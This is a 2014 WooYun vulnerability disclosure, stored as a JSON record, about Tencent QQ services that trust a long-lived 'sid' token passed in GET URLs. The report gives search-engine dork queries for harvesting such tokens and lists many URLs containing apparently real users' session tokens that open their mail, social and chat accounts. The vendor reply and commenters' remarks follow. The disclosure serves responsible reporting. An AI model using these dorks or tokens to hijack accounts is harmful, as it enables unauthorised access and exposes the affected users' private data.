{"id": 48920, "wybug_id": "wooyun-2014-081109", "wybug_title": "腾讯某业务逻辑控制不严可导致用户在不知情的情况下账号被盗(影响聊天、空间、微博、邮箱等全线业务)", "wybug_corp": "腾讯", "wybug_author": "临时工", "wybug_date": "2014-10-28 18:41", "wybug_open_date": "2014-12-12 18:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "敏感接口缺乏校验", "逻辑错误", "设计不当", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-12：\t细节向公众公开  简要描述： 有N多成功实例可证明危害性 详细说明：  1.问题起因，sid这个参数，腾讯很多业务都使用sid单个参数做用户识别，然后还都是get请求，这种模式对于现在的网络安全环境来说，有点2了，而且请求过程也都是非加密的，抓取到通信即可获取，sid的有效期我发现也特别长，即使同一QQ生成多组sid也均会有效，那么下面问题来了？举个例子：(例子来自于搜索引擎抓取到的sid，无需密码即可使用全线业务，真变态，原来还真不知道)site:vip.qq.com inurl:sid=\n\nsite:qq.com inurl:card/index inurl:sid=site:mc.vip.qq.com inurl:sid=\n\n\n\nsite:qq.com inurl:sid=A\n\n还有很多搜索方法，搜索引擎很给力吖有效的sid是24位，都是A开头的，可以从搜索引擎里找到相当一部分有效的。而且搜索引擎抓取的时间都是几个月前，那也就是说sid的有效时间很长，但是有个情况，就是我带着搜索到的sid访问一些业务之后，突然会失效，但是隔了几天或者很长时间，sid又有效了，很奇怪，不然早提交上来了，等着sid都有效。   漏洞证明：  2.qq业务列表：(下面的sid均来自搜索引擎，当你测试的时候不见的都有效)http://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0\n\nhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=ASgc4S73J9ioV2max7BYk_jqhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0http://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AVlYOq9Gr9WXTQx-o0BCH_4ehttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AVbMZcf6i0b6L7udTckv3-gEhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AfstupcmnyfABb-D0gSjTK9rhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AUUvPjFYfHvhFs0UFc88gbCqhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=ARK7Ydu40t21Ytd7wHKvcpiHhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AVApzk2ozFT9naJlAaTY1BGlhttp://qbar.3g.qq.com/g/qbar/qbar_list.jsp?sid=AWR_cLCYmi2TBN6jpxry44pc......qq空间：http://ish.z.qq.com/infocenter_v2.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0\n\nqq微博：可以强加关注了http://tapp.3g.qq.com/g/s?g_f=4719&g_ut=2&aid=h&sid=AcaYiNOTAAwj-34Gt1wL8Jc0&coid=qzone\n\nqq邮箱：尼玛吖，从来不知道还有这个邮箱入口http://w.mail.qq.com/cgi-bin/today?sid=jOjed82ocilmASF1XcHT5vNw,4,zQEJ7KD-F&first=1&sid=AcaYiNOTAAwj-34Gt1wL8Jc0\n\nqq家园触屏版：可以和好友聊天了http://house60.3g.qq.com/touch/index.jsp?sid=AcaYiNOTAAwj-34Gt1wL8Jc0#house/friends/all\n\nqq好友、群列表：上面触屏版好友不全，可这里面就多了，qq号在源码里http://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AcaYiNOTAAwj-34Gt1wL8Jc0#house/friends/all\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=ASgc4S73J9ioV2max7BYk_jq\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AcaYiNOTAAwj-34Gt1wL8Jc0\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AVlYOq9Gr9WXTQx-o0BCH_4e\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AVbMZcf6i0b6L7udTckv3-gE\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AfstupcmnyfABb-D0gSjTK9r\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AUUvPjFYfHvhFs0UFc88gbCq\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=ARK7Ydu40t21Ytd7wHKvcpiH\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AVApzk2ozFT9naJlAaTY1BGl\n\nhttp://openmobile.qq.com/oauth2.0/m_jump?page=shareindex.html&sid=AWR_cLCYmi2TBN6jpxry44pc......还有很多其他业务，我想QQ主人自己都不知道账号已失窃   修复方案：  肯定懂得修复，就看你们想怎么处理了   版权声明：转载请注明来源 临时工@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-10-29 16:16 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对腾讯业务安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-29 16:41 |    \t\t小薇2013 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:5        | 我就看看我不说话！)\t\t \n  这么叼为什么才5    \n     2014-10-29 17:04 |    \t\txsjswt \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:49        | 我思故我猥琐，我猥琐故我强大)\t\t \n  这么叼为什么才5     \n     2014-10-29 17:13 |    \t\t临时工 \t\t\t( 普通白帽子  |\t\t\t        Rank:122 漏洞数:11        | 初来乍到)\t\t \n  这么叼为什么才5    \n     2014-10-29 17:31 |    \t\t风情万种 \t\t\t( 普通白帽子  |\t\t\t        Rank:181 漏洞数:63        | 不再相信爱了)\t\t \n  这么叼为什么才5    \n     2014-10-29 17:49 |    \t\t黑色的屌丝 \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:5        | →_→→_→)\t\t \n  应该是某个登录接口不会让已经登录的QQ掉线。你信吗？    \n     2014-10-29 18:07 |    \t\t临时工 \t\t\t( 普通白帽子  |\t\t\t        Rank:122 漏洞数:11        | 初来乍到)\t\t \n  我感觉中危还是可以的，有些用户还是可以影响到的    \n     2014-10-29 19:02 |    \t\t写个七 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 一点一点积累。)\t\t \n  这么叼为什么才5     \n     2014-11-02 12:13 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  估计又会精    \n     2014-11-28 16:24 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  这么叼为什么才5             ......善于发现周围细微的事务，洞主不错    \n     2014-11-28 16:32 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @@ 怎么还都能访问    \n     2014-12-12 19:17 |    \t\tthatqier \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:7        | 小白一个)\t\t \n  这么叼为什么才5    \n     2014-12-12 20:48 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  这么叼为什么才5    \n     2014-12-12 21:32 |    \t\t中国公民 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:12        | 脱裤不提交，提交不脱裤)\t\t \n  这么叼为什么才5    \n     2014-12-12 21:53 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  这么叼为什么才5     \n     2014-12-12 21:53 |    \t\t4399gdww \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:4        | )\t\t \n  因为是临时工干的，哈哈    \n     2014-12-12 21:55 |    \t\t月光光 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 光光光光～)\t\t \n  我累个擦 才5rank    \n     2014-12-13 01:01 |    \t\tevil \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:21        )\t\t \n  这么叼为什么才5    \n     2014-12-13 03:29 |    \t\tV-King \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:7        | 我是静静)\t\t \n  这么叼为什么才5     \n     2014-12-13 17:24 |    \t\t斯杰 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:5        | By：S丶jer)\t\t \n  这么叼为什么才5    \n     2015-06-04 18:49 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  破队形，因为洞主和其他黑客都在不断的访问这些搜索结果导致sid不断被保留，类似于xss平台里面的keep session    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}